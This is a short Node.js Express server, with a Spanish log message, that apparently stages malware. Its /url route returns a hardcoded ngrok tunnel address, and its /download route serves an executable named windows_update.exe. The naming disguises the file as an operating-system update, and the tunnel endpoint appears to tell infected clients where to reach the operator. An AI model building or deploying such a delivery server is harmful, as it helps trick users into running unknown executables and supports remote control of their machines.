const express = require('express');
const app = express();
const PORT = process.env.PORT || 4500;

app.all('/url', (req, res) => {
    res.send('https://0b4f-190-192-75-210.sa.ngrok.io')
})

app.get('/download', function (req, res) {
    const file = `${__dirname}/windows_update.exe`;
    res.download(file);
});

app.listen(PORT)
console.log(`Servidor listen on port ${PORT}`)